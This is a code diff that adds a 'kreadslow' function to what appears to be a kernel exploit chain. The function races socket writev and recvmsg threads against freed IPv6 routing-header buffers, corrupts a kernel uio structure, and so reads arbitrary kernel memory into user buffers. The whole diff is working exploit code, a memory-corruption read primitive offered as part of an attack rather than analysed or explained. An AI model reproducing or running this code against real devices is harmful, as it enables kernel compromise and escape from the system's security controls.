@@ -1574,6 +1574,149 @@ function leak_kqueue() {
  * ===========================
  */
 
+function kreadslow(addr, size) {
+  debug('Enter kreadslow addr: ' + hex(addr) + ' size : ' + size);
+
+  if (debugging.info.memory.available === 0) {
+    log('kreadslow - Memory exhausted before start');
+    cleanup();
+    return BigInt_Error;
+  }
+
+  const leak_buffers = new Array(UIO_THREAD_NUM);
+  for (let i = 0; i < UIO_THREAD_NUM; i++) {
+    leak_buffers[i] = malloc(size);
+  }
+
+  write32(sockopt_val_buf, size);
+  setsockopt(new BigInt(uio_sock_1), SOL_SOCKET, SO_SNDBUF, sockopt_val_buf, 4);
+
+  write(new BigInt(uio_sock_1), tmp, size);
+  write64(uioIovRead.add(0x08), size);
+
+  free_rthdr(ipv6_socks[triplets[1]]);
+
+  const uio_leak_add = leak_rthdr.add(0x08);
+
+  let count = 0;
+  let zeroMemoryCount = 0;
+
+  while (count < 10000) {
+    if (debugging.info.memory.available === 0) {
+      zeroMemoryCount++;
+      if (zeroMemoryCount >= 5) {
+        log('netctrl failed!');
+        cleanup();
+        return BigInt_Error;
+      }
+    } else {
+      zeroMemoryCount = 0;
+    }
+
+    count++;
+    trigger_uio_writev();
+    sched_yield();
+
+    get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x10);
+
+    if (read32(uio_leak_add) === UIO_IOV_NUM) {
+      break;
+    }
+
+    read(new BigInt(uio_sock_0), tmp, size);
+
+    for (let i = 0; i < UIO_THREAD_NUM; i++) {
+      read(new BigInt(uio_sock_0), leak_buffers[i], size);
+    }
+
+    wait_uio_writev();
+    write(new BigInt(uio_sock_1), tmp, size);
+  }
+
+  if (count === 10000) {
+    return BigInt_Error;
+  }
+
+  const uio_iov = read64(leak_rthdr);
+  build_uio(msgIov, uio_iov, 0, true, addr, size);
+
+  free_rthdr(ipv6_socks[triplets[2]]);
+
+  const iov_leak_add = leak_rthdr.add(0x20);
+
+  let count2 = 0;
+  let zeroMemoryCount2 = 0;
+
+  while (true) {
+    count2++;
+
+    if (debugging.info.memory.available === 0) {
+      zeroMemoryCount2++;
+      if (zeroMemoryCount2 >= 5) {
+        log('netctrl failed!');
+        cleanup();
+        return BigInt_Error;
+      }
+    } else {
+      zeroMemoryCount2 = 0;
+    }
+
+    trigger_iov_recvmsg();
+    sched_yield();
+
+    get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x40);
+
+    if (read32(iov_leak_add) === UIO_SYSSPACE) {
+      break;
+    }
+
+    write(new BigInt(iov_sock_1), tmp, 1);
+    wait_iov_recvmsg();
+    read(new BigInt(iov_sock_0), tmp, 1);
+  }
+
+  read(new BigInt(uio_sock_0), tmp, size);
+
+  let leak_buffer = new BigInt(0);
+  const tag_val = new BigInt(0x41414141, 0x41414141);
+
+  for (let i = 0; i < UIO_THREAD_NUM; i++) {
+    read(new BigInt(uio_sock_0), leak_buffers[i], size);
+    const val = read64(leak_buffers[i]);
+
+    if (!val.eq(tag_val)) {
+      triplets[1] = find_triplet(triplets[0], -1);
+      leak_buffer = leak_buffers[i].add(0);
+    }
+  }
+
+  wait_uio_writev();
+  write(new BigInt(iov_sock_1), tmp, 1);
+
+  if (leak_buffer.eq(0)) {
+    wait_iov_recvmsg();
+    read(new BigInt(iov_sock_0), tmp, 1);
+    return BigInt_Error;
+  }
+
+  for (let retry = 0; retry < 3; retry++) {
+    triplets[2] = find_triplet(triplets[0], triplets[1]);
+    if (triplets[2] !== -1) break;
+    sched_yield();
+  }
+
+  if (triplets[2] === -1) {
+    wait_iov_recvmsg();
+    read(new BigInt(iov_sock_0), tmp, 1);
+    return BigInt_Error;
+  }
+
+  wait_iov_recvmsg();
+  read(new BigInt(iov_sock_0), tmp, 1);
+
+  return leak_buffer;
+}
+
 function kreadslow64(address: BigInt) {
   const buffer = kreadslow(address, 8)
   if (buffer.eq(BigInt_Error)) {
